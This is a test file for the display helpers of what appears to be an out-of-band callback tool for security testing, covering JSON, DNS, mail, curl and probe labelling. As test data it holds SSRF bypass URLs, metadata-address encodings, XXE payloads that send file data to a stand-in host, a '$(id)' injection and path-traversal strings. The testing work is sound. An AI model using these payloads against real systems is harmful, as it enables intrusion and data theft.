// Display helpers for the Parsed HTTP view: nothing may change the data it shows.
// Run: node --test web/test/view.test.ts (Node strips the types).
import { test } from "node:test";
import assert from "node:assert/strict";
import { layoutJson } from "../src/lib/jsonview.ts";
import { showControls, decodedQuery } from "../src/lib/query.ts";
import { dnsLine, mailLine } from "../src/lib/dnsview.ts";

const text = (segs: ReturnType<typeof layoutJson>) => segs!.map((s) => s.s).join("");
const tokens = (segs: ReturnType<typeof layoutJson>) => segs!.filter((s) => s.k !== "ws").map((s) => s.s.trim()).join("");

test("json: big integers, escapes and duplicate keys survive", () => {
  const src = '{"id":12345678901234567890,"role":"user","role":"admin","note":"caf\\u00e9"}';
  const segs = layoutJson(src)!;
  assert.equal(tokens(segs), src, "every token kept byte for byte");
  assert.match(text(segs), /12345678901234567890/);
  assert.match(text(segs), /caf\\u00e9/);
  const roles = segs.filter((s) => s.k === "key" && s.s === '"role"');
  assert.deepEqual(roles.map((r) => r.dup), [false, true]);
});

test("json: layout is indented, nesting and empties", () => {
  assert.equal(text(layoutJson('{"a":[1,{"b":null}],"c":{},"d":[]}')), '{\n  "a": [\n    1,\n    {\n      "b": null\n    }\n  ],\n  "c": {},\n  "d": []\n}');
  assert.equal(text(layoutJson(" 42 ")), "42");
});

test("json: anything invalid returns null", () => {
  for (const bad of ["", "{", '{"a":1,}', "[1 2]", "{'a':1}", '{"a":01}', "1 2", '"a\nb"', "NaN"]) assert.equal(layoutJson(bad), null, bad);
});

test("query: decoded values keep + and show control characters", () => {
  assert.deepEqual(decodedQuery("next=a%2Bb+c&x=%0Aid&bare&bad=%E0%A4"), [
    { name: "next", value: "a+b+c", raw: "a%2Bb+c", changed: true },
    { name: "x", value: "\nid", raw: "%0Aid", changed: true },
    { name: "bare", value: null, raw: null, changed: false },
    { name: "bad", value: "%E0%A4", raw: "%E0%A4", changed: false },
  ]);
  assert.deepEqual(showControls("a\nb\tc\u0001"), [["text", "a"], ["ctl", "\\n"], ["text", "b"], ["ctl", "\\t"], ["text", "c"], ["ctl", "\\x01"]]);
});

import { dnsSteps, mostSpecific } from "../src/lib/dns.ts";

test("dns: resolver steps toward a longer name are flagged, real names are not", () => {
  const id = "c0ffee12a3b4c5d6e7f8k3m9qx7wz2pdn";
  const at = (s: number) => `2026-11-05T10:00:${String(s).padStart(2, "0")}.000Z`;
  const list = [
    { id: 1, protocol: "dns", fullId: `bbop.${id}`, remoteAddress: "1.1.1.1", timestamp: at(0) },
    { id: 2, protocol: "dns", fullId: `root.bbop.${id}`, remoteAddress: "1.1.1.1", timestamp: at(1) },
    { id: 3, protocol: "dns", fullId: `ip-10-0-3-17.root.bbop.${id}`, remoteAddress: "1.1.1.1", timestamp: at(1) },
    { id: 4, protocol: "dns", fullId: `root.bbop.${id}`, remoteAddress: "8.8.8.8", timestamp: at(2) }, // other resolver: real
    { id: 5, protocol: "dns", fullId: `x.root.bbop.${id}`, remoteAddress: "1.1.1.1", timestamp: at(30) }, // too late
  ];
  const steps = dnsSteps(list);
  assert.equal(steps.get(1), `ip-10-0-3-17.root.bbop.${id}`);
  assert.equal(steps.get(2), `ip-10-0-3-17.root.bbop.${id}`);
  assert.equal(steps.has(3), false);
  assert.equal(steps.has(4), false);
  assert.equal(steps.has(5), false);
  assert.equal(mostSpecific(list).id, 3);
});

import { decodeExfil, decodeLabels } from "../src/lib/exfil.ts";

test("exfil: hex, base32 and base64url decode only to printable text", () => {
  assert.deepEqual(decodeExfil("726f6f74", { dns: true }), { kind: "hex", text: "root" });
  assert.deepEqual(decodeExfil("ORSXG5BAMRQXIYI", { dns: true }), { kind: "base32", text: "test data" });
  assert.deepEqual(decodeExfil("cm9vdDp4OjA6MA"), { kind: "base64url", text: "root:x:0:0" });
  assert.equal(decodeExfil("cm9vdDp4OjA6MA", { dns: true }), null, "no base64 for case-insensitive DNS");
  for (const plain of ["admin", "integration", "password", "ip-10-0-3-17", "e2e", "deadbeefcafe0000"]) assert.equal(decodeExfil(plain, { dns: true }), null, plain);
  assert.deepEqual(decodeLabels(["726f6f", "74"]), [{ label: "726f6f.74", decoded: { kind: "hex", text: "root" } }]);
  assert.deepEqual(decodeLabels(["726f6f74", "ip-10-0-3-17"]), [{ label: "726f6f74", decoded: { kind: "hex", text: "root" } }]);
});

import { toCurl } from "../src/lib/curl.ts";

test("curl: rebuilt request is shell-safe and drops computed headers", () => {
  const raw = "POST /hook?a=1 HTTP/1.1\r\nHost: x.example\r\nContent-Length: 9\r\nContent-Type: application/json\r\nX-Evil: it's $(id)\r\n\r\n{\"a\":\"'\"}";
  assert.equal(toCurl(raw, "https", { id: 7, normalised: true }),
    "# Rebuilt from Colluder hit #7; interactsh normalised header order and name case\n" +
    "curl -sS -g --path-as-is 'https://x.example/hook?a=1' -H 'Content-Type: application/json' -H 'X-Evil: it'\\''s $(id)' --data-binary '{\"a\":\"'\\''\"}'");
  assert.equal(toCurl("PUT /x HTTP/1.1\r\nHost: h\r\n\r\n", "http", { id: 1, normalised: false }), "# Rebuilt from Colluder hit #1\ncurl -sS -g --path-as-is -X PUT 'http://h/x'");
  const odd = toCurl("GET /a/../../etc/passwd?q={{7*7}}&ip=[::1] HTTP/1.1\r\nHost: h\r\nAccept-Encoding: gzip\r\n\r\nbody", "http", { id: 2, normalised: false, truncated: 5 })!;
  assert.match(odd, /curl -sS -g --path-as-is --compressed -X GET 'http:\/\/h\/a\/\.\.\/\.\.\/etc\/passwd\?q=\{\{7\*7\}\}&ip=\[::1\]'/);
  assert.match(odd, /^# The body was truncated at capture \(5 bytes dropped\)/m);
  assert.equal(toCurl("garbage", "http", { id: 1, normalised: false }), null);
});

import { reachOf, statusAt } from "../src/lib/reach.ts";

test("reach: deepest hop says how many redirects were followed and which code stopped it", () => {
  const r = { mode: "redirect", status: 302, loop: 9, hopStatuses: [305, 309] };
  assert.equal(statusAt(r, 1), 305);
  assert.equal(statusAt(r, 2), 309);
  assert.equal(statusAt(r, 10), 302);
  const c = (maxHop: number, minHop = 1) => ({ ip: "203.0.113.9", ua: "Wget/1.21.4 extra", maxHop, minHop, hits: maxHop });
  assert.equal(reachOf(r, c(1)), "Wget/1.21.4 from 203.0.113.9 reached hop 1 of 10: followed 0 redirects, then stopped at a 305");
  assert.equal(reachOf(r, c(2)), "Wget/1.21.4 from 203.0.113.9 reached hop 2 of 10: followed 1 redirect, then stopped at a 309");
  assert.equal(reachOf({ ...r, location: "http://169.254.169.254/latest/meta-data/" }, c(10)),
    "Wget/1.21.4 from 203.0.113.9 reached the last hop (10 of 10) and got the 302 → 169.254.169.254; whether it followed shows in the target's response");
  assert.match(reachOf({ mode: "redirect", status: 307, loop: 3 }, c(3, 3))!, /stopped at a 307 \(no earlier hops from this client/);
  assert.equal(reachOf({ mode: "custom" }, c(3)), null);
  assert.equal(reachOf(r, c(0)), null);
});

import { callbacks, bypasses, addressForms, formUrl, variantOf, encode } from "../src/lib/kit.ts";

test("kit: callbacks and bypasses carry their code next to the tag; codes are unique", () => {
  const H = "abcdefghij0123456789klmnopqrstuvw.oob.example";
  const cb = callbacks("fetch", H), by = bypasses("fetch", H, "api.shop.example");
  const codes = [...cb, ...by].map((p) => p.code);
  assert.equal(new Set(codes).size, codes.length);
  assert.equal(cb[0].text, `http://kc1.fetch-${H}/`);
  assert.equal(cb[1].text, `https://fetch-${H}/k/kc2`);
  assert.equal(cb.find((p) => p.code === "kc6")!.text, `\\\\kc6.fetch-${H}\\k`);
  assert.equal(by[0].text, `http://api.shop.example@ka1.fetch-${H}/`);
  assert.equal(by[2].text, `http://ka3.fetch-${H}#@api.shop.example/`);
  assert.equal(by[4].text, `http://ka5.fetch-${H}\\@api.shop.example/`);
  assert.equal(by[8].text, `http://ka9。fetch-${H.replace(/\./g, "。")}/`);
  for (const p of [...cb, ...by]) assert.match(p.text, /fetch/, p.code);
});

test("kit: every numeric address form is the same 32-bit address", () => {
  // inet_aton rules: 1–4 parts, each decimal, 0x hex or 0-led octal; the last part fills the rest
  const aton = (s: string) => {
    const parts = s.split(".").map((x) => (/^0x/i.test(x) ? parseInt(x, 16) : /^0\d/.test(x) ? parseInt(x, 8) : Number(x)));
    const last = parts.pop()!;
    return parts.reduce((acc, p, i) => acc + p * 2 ** (24 - 8 * i), 0) + last;
  };
  const forms = addressForms("169.254.169.254")!;
  const numeric = forms.filter((f) => /^[0-9x.a-f]+$/i.test(f.host) && !f.host.includes("nip"));
  assert.ok(numeric.length >= 8);
  for (const f of numeric) assert.equal(aton(f.host), 0xa9fea9fe, `${f.name}: ${f.host}`);
  assert.equal(forms.find((f) => f.name === "Decimal")!.host, "2852039166");
  assert.equal(forms.find((f) => f.name === "IPv6, mapped hex")!.host, "[::ffff:a9fe:a9fe]");
  assert.equal(formUrl(forms[0], "latest/meta-data/"), "http://169.254.169.254/latest/meta-data/");
  assert.ok(addressForms("127.0.0.1")!.some((f) => f.host === "0"));
  assert.equal(addressForms("256.1.1.1"), null);
  assert.equal(addressForms("10.0.0"), null);
});

test("kit: a hit names the payload that fired", () => {
  assert.equal(variantOf({ extraLabels: ["api", "shop", "example", "ka6"] })!.name, "Expected host as a subdomain");
  assert.equal(variantOf({ extraLabels: [], summary: "GET /fetch/k/kc2 HTTP/1.1 · curl/8" })!.code, "kc2");
  assert.equal(variantOf({ protocol: "smtp", rawRequest: "MAIL FROM:<a@b>\r\nRCPT TO:<kc5@fetch.x>\r\n" })!.code, "kc5");
  assert.equal(variantOf({ extraLabels: ["726f6f74"], summary: "GET /fetch/k/zz9 HTTP/1.1" }), null);
  assert.equal(encode("http://a/?b=c&d", "once"), "http%3A%2F%2Fa%2F%3Fb%3Dc%26d");
  assert.equal(encode("a b", "twice"), "a%2520b");
});

import { METADATA, redirectable, hostOf, pathOf } from "../src/lib/metadata.ts";
// @ts-ignore: plain JS module shared with the edge
import { validateHttpRule } from "../../lib/rules.mjs";

test("metadata: ids unique, every redirectable URL is a valid redirect Location", () => {
  assert.equal(new Set(METADATA.map((r) => r.id)).size, METADATA.length);
  for (const r of METADATA) {
    assert.ok(hostOf(r.url), r.id);
    if (redirectable(r)) assert.equal(validateHttpRule({ mode: "redirect", location: r.url }).error, undefined, r.id);
  }
  assert.equal(hostOf("http://[fd00:ec2::254]/latest/"), "fd00:ec2::254");
  assert.equal(pathOf(METADATA.find((r) => r.id === "azure")!.url), "/metadata/instance?api-version=2021-02-01");
  assert.ok(!redirectable(METADATA.find((r) => r.id === "gcp")!));
});

import { stageOf } from "../src/lib/stage.ts";

test("stage: labels say what the edge sent, and a later hop is what proves following", () => {
  assert.equal(stageOf({ summary: "HEAD / HTTP/1.1", decoy: "method" }), "decoy reply to a HEAD request");
  assert.equal(stageOf({ hop: 1, hopCode: 305 }), "hop 1: answered 305");
  assert.equal(stageOf({ hop: 2 }), "followed 1 redirect · hop 2: answered a redirect");
  assert.equal(stageOf({ hop: 3, answerCode: 302, answerTo: "169.254.169.254" }), "followed 2 redirects · answered 302 → 169.254.169.254");
  assert.equal(stageOf({ answerCode: 302, answerTo: "169.254.169.254" }), "answered 302 → 169.254.169.254");
  assert.equal(stageOf({ summary: "GET / HTTP/1.1" }), null);
});

import { xxePayloads } from "../src/lib/kit.ts";
import { xxeData } from "../src/lib/stage.ts";

test("xxe: payloads load the DTD over HTTP with their code; the data hit decodes", () => {
  const H = "abcdefghij0123456789klmnopqrstuvw.oob.example";
  const ps = xxePayloads("x1", H);
  assert.equal(ps[0].text, `<!DOCTYPE x SYSTEM "http://kx1.x1-${H}/x.dtd">`);
  assert.equal(ps.find((p) => p.code === "kx7")!.text, `http://kx7.x1-${H}/feed.xml`);
  assert.equal(variantOf({ extraLabels: ["kx0"] })!.name, "File data from the DTD");
  assert.equal(stageOf({ answerPart: "x.dtd" }), "served x.dtd");
  assert.equal(stageOf({ fullId: "kx0.x1.abc", summary: "GET /d?d=hostname%0A HTTP/1.1" }), "file data: hostname\\n");
  assert.equal(xxeData({ fullId: "kx0.x1.abc", summary: "GET /d?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo= HTTP/1.1" }), "root:x:0:0:root:/root:/bin/bash\\n (base64, decoded)");
  assert.equal(xxeData({ fullId: "kx1.x1.abc", summary: "GET /d?d=x HTTP/1.1" }), null, "only the DTD's own exfil hit");
});

test("review 4: XXE data takes all after d=, says when empty; DNS exfil skips the variant code", () => {
  assert.equal(xxeData({ fullId: "kx0.x1.abc", summary: "GET /d?d=DB_USER=app&DB_PASS=x HTTP/1.1 · Java/1.8" }), "DB_USER=app&DB_PASS=x");
  assert.equal(xxeData({ fullId: "kx0.x1.abc", summary: "GET /d?d= HTTP/1.1" }), "empty (the DTD ran; the read returned nothing)");
  assert.equal(xxeData({ fullId: "kx0.x1.abc", rawRequest: "GET /d?d=line one\nline two HTTP/1.1\r\nHost: h\r\n\r\n" }), "line one\\nline two");
  assert.equal(stageOf({ answerMode: "tls" }), "TLS handshake only: no request arrived");
  assert.equal(stageOf({ malformed: "bad request line", answerPart: "x.dtd" }), "malformed request · served x.dtd");
  const hex = Buffer.from("uid=1000(op) gid=1000").toString("hex");
  assert.equal(decodeLabels([hex.slice(0, 30), hex.slice(30), "kc3"])[0].decoded.text, "uid=1000(op) gid=1000");
});

// DNS and mail raw panes are tinted for reading, but they are evidence: every line must come back whole
const joined = (segs: { s: string }[]) => segs.map((g) => g.s).join("");
const kinds = (segs: { s: string; k: string }[]) => Object.fromEntries(segs.filter((g) => g.k !== "plain").map((g) => [g.s.trim(), g.k]));

test("dns lines: tinted segments join back to the exact line", () => {
  const lines = [
    ";; opcode: QUERY, status: NOERROR, id: 9692",
    ";; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1",
    "; EDNS: version 0; flags: do; udp: 1452",
    ";; QUESTION SECTION:",
    ";x.orca-k7wq2x.alt.example.\tIN\t MX",
    "x.orca-k7wq2x.alt.example.\t3600\tIN\tMX\t1 mail.oob.example.",
    "ORCA.c0ffee12a3.oob.example. 60 IN A 203.0.113.10",
    ";; opcode: QUERY, status: NXDOMAIN, id: 1",
    "", "not dns at all \u0000 \r", ";", "x 1 IN TXT \"a b\" \"c\"",
  ];
  for (const ln of lines) for (const tag of ["orca", null]) assert.equal(joined(dnsLine(ln, tag)), ln, ln);
});

test("dns lines: what gets which ink", () => {
  const q = kinds(dnsLine(";x.orca-k7wq2x.alt.example.\tIN\t MX", "orca"));
  assert.equal(q.MX, "type");
  assert.equal(q.orca, "tag", "the tag part of <tag>-<id> is marked");
  assert.equal(q.IN, "ash");
  const r = kinds(dnsLine("ORCA.c0ffee12a3.oob.example. 60 IN A 203.0.113.10", "orca"));
  assert.equal(r.ORCA, "tag", "DNS names are case-insensitive");
  assert.equal(r["203.0.113.10"], "value");
  assert.equal(r["60"], "ash");
  assert.equal(kinds(dnsLine(";; opcode: QUERY, status: NOERROR, id: 9692", null)).NOERROR, "ok");
  assert.equal(kinds(dnsLine(";; opcode: QUERY, status: SERVFAIL, id: 9692", null)).SERVFAIL, "bad");
  assert.equal(dnsLine(";; ANSWER SECTION:", null)[0].k, "head");
  assert.ok(!kinds(dnsLine("x.orca-k7wq2x.alt.example.", "orca")).orca, "a line that isn't a record isn't guessed at");
});

test("mail lines: field names tinted in the header block only, text kept", () => {
  for (const [ln, head] of [["Subject: Your code is 123456", true], ["\tby mail.example (Colluder)", true], ["Subject: in the body", false], ["", true], ["X-Weird:", true]] as const) {
    assert.equal(joined(mailLine(ln, head)), ln);
  }
  assert.equal(mailLine("Subject: hi", true)[0].k, "field");
  assert.equal(mailLine("Subject: hi", false)[0].k, "plain");
  assert.equal(mailLine("\tfolded: line", true)[0].k, "plain", "a folded continuation isn't a field");
});

test("crew coats: stable per tag, case-blind, spread over the probes in use", async () => {
  const { crewCoat, crewIndex } = await import("../src/lib/crew.ts");
  assert.equal(crewCoat("orca"), crewCoat("orca"));
  assert.equal(crewCoat("Orca"), crewCoat("orca"));
  assert.match(crewCoat("orca"), /^oklch\(0\.(66|84) 0\.085 \d+\)$/);
  const tags = ["orca", "orca-otp-inbox", "mailcheck", "sso-target", "import-ssrf", "healthcheck", "signup7", "avatar", "r4check", "r4xxe", "webhook"];
  assert.ok(new Set(tags.map(crewIndex)).size >= 7, "eleven tags should wear at least seven coats");
  // no coat sits on amber's hue (eyes and "new" own it)
  for (const t of tags) { const h = Number(/ (\d+)\)$/.exec(crewCoat(t))![1]); assert.ok(h < 60 || h > 95, `${t}: hue ${h}`); }
});

test("crew coats: active probes never share one; earlier probes keep theirs", async () => {
  const { crewCoats } = await import("../src/lib/crew.ts");
  const tags = ["orca", "orca-otp-inbox", "mailcheck", "sso-target", "import-ssrf", "healthcheck", "signup7", "avatar", "r4check", "r4xxe", "webhook"];
  const probes = tags.map((tag, n) => ({ tag, plantedAt: `2026-11-${String(n + 1).padStart(2, "0")}T00:00:00Z` }));
  const a = crewCoats(probes);
  assert.equal(new Set(a.values()).size, tags.length);
  const b = crewCoats([...probes, { tag: "newcomer", plantedAt: "2026-11-30T00:00:00Z" }]);
  for (const t of tags) assert.equal(b.get(t), a.get(t), `${t} kept its coat`);
  const c = crewCoats([...probes, ...Array.from({ length: 30 }, (_, n) => ({ tag: `old${n}`, plantedAt: "2026-10-01T00:00:00Z", retiredAt: "2026-10-02T00:00:00Z" }))]);
  for (const t of tags) assert.equal(c.get(t), a.get(t), `${t}: retired probes pick after the active ones`);
});

test("crew coats: a retired probe with a late hit is back on the list and picks with the active ones", async () => {
  const { crewCoats, crewIndex } = await import("../src/lib/crew.ts");
  // 16 retired probes that already wear every coat, then a late-hit one that must not repeat its active neighbour's
  const filler = Array.from({ length: 40 }, (_, n) => ({ tag: `gone${n}`, plantedAt: "2026-01-01T00:00:00Z", retiredAt: "2026-01-02T00:00:00Z" }));
  const active = { tag: "a1", plantedAt: "2026-11-01T00:00:00Z" };
  const late = { tag: [...Array(200).keys()].map((n) => `late${n}`).find((t) => crewIndex(t) === crewIndex("a1"))!, plantedAt: "2026-11-02T00:00:00Z", retiredAt: "2026-11-03T00:00:00Z", lastHitAt: "2026-11-04T00:00:00Z" };
  const m = crewCoats([...filler, active, late]);
  assert.notEqual(m.get(late.tag), m.get("a1"));
});

test("payload parts: the shared host recedes, the tag and code stand out, text joins back exactly", async () => {
  const { payloadParts } = await import("../src/lib/kit.ts");
  const host = "c0ffee12a3b4c5d6e7f8r8t2vb6ny4hcs.oob.example", short = "k7wq2x.alt.example";
  const cases = [
    [`http://kc1.orca-${host}/`, "kc1"], [`https://orca-${host}/k/kc2`, "kc2"], [`kc5@orca-${host}`, "kc5"],
    [`\\\\kc6.orca-${host}\\k`, "kc6"], [`http://kc1.orca-${short}/`, "kc1"], [`http%3A%2F%2Fkc1.orca-${host}%2F`, "kc1"], [`orca-${host}`, undefined],
  ] as const;
  for (const [text, code] of cases) {
    const parts = payloadParts(text, "orca", [host, short], code);
    assert.equal(parts.map((p) => p.s).join(""), text);
    assert.deepEqual(parts.filter((p) => p.k === "tag").map((p) => p.s), ["orca"], text);
    assert.ok(parts.some((p) => p.k === "host" && p.s.endsWith(text.includes(short) ? short : host)), text);
    if (code) assert.deepEqual(parts.filter((p) => p.k === "code").map((p) => p.s), [code], text);
  }
  // a tag inside another word isn't marked; no hosts given leaves the host plain
  assert.deepEqual(payloadParts("http://orcas.example/", "orca").map((p) => p.k), ["plain"]);
});

test("user agents in a few words; browser boilerplate headers recognised", async () => {
  const { uaShort, isStandardHeader } = await import("../src/lib/headers.ts");
  const cases: [string, string][] = [
    ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", "Chrome 150 on macOS"],
    ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0", "Edge 131 on Windows"],
    ["Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0", "Firefox 133 on Linux"],
    ["Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", "Safari 18 on iOS"],
    ["Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36", "Chrome 130 on Android"],
    ["curl/8.5.0", "curl 8.5.0"], ["python-requests/2.32.3", "python-requests 2.32.3"], ["Go-http-client/1.1", "Go-http-client 1.1"],
    ["colluder-verify/r4", "colluder-verify/r4"],
    ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Googlebot 2.1"],
    ["", ""],
  ];
  for (const [ua, want] of cases) assert.equal(uaShort(ua), want, ua);
  assert.ok(isStandardHeader("Sec-CH-UA-Platform") && isStandardHeader("accept-encoding"));
  assert.ok(!isStandardHeader("Host") && !isStandardHeader("User-Agent") && !isStandardHeader("Authorization") && !isStandardHeader("X-Forwarded-For"));
});

test("crew kinds: the first eleven on the list are eleven different animals, and keep them as the crew grows", async () => {
  const { crewKinds, crew, SPECIES } = await import("../src/lib/crew.ts");
  const tags = ["orca", "orca-otp-inbox", "mailcheck", "sso-target", "import-ssrf", "healthcheck", "signup7", "avatar", "r4check", "r4xxe", "xxtest"];
  const probes = tags.map((tag, n) => ({ tag, plantedAt: `2026-11-${String(n + 1).padStart(2, "0")}T00:00:00Z` }));
  const a = crewKinds(probes);
  assert.equal(new Set(a.values()).size, SPECIES.length);
  const b = crewKinds([...probes, { tag: "newcomer", plantedAt: "2026-11-30T00:00:00Z" }]);
  for (const t of tags) assert.equal(b.get(t), a.get(t), `${t} kept its kind`);
  for (const [, look] of crew(probes)) { assert.ok(SPECIES.includes(look.species)); assert.match(look.coat, /^oklch\(/); }
});

test("crew kinds: adding the shark kept every other tag's animal", async () => {
  const { crewSpecies } = await import("../src/lib/crew.ts");
  // each tag's own kind before the shark joined (2026-11-12); only the ones the shark hash picks change
  const before: Record<string, string> = { orca: "monkey", "orca-otp-inbox": "dog", mailcheck: "fox", "sso-target": "rabbit", "import-ssrf": "owl",
    healthcheck: "bird", signup7: "monkey", r4check: "cat", r4xxe: "raccoon", xxtest: "dog", testing: "bear", third: "raccoon", rerank: "rabbit",
    "webhook-test": "bear", "pdf-render": "monkey", "avatar-fetch": "bear", "xxe-import": "raccoon", "mail-reset": "fox", "sso-callback": "fox",
    "oembed-preview": "rabbit", "import-csv": "bird", jaws: "fox", fin: "monkey", bruce: "raccoon", nemo: "monkey", reef: "bird", tide: "bear" };
  for (const [tag, kind] of Object.entries(before)) assert.equal(crewSpecies(tag), kind, tag);
  assert.equal(crewSpecies("avatar"), "shark");
  const sharks = Array.from({ length: 1100 }, (_, i) => crewSpecies(`t${i}`)).filter((k) => k === "shark").length;
  assert.ok(sharks > 60 && sharks < 140, `about one tag in eleven or twelve is a shark (${sharks} of 1100)`);
});
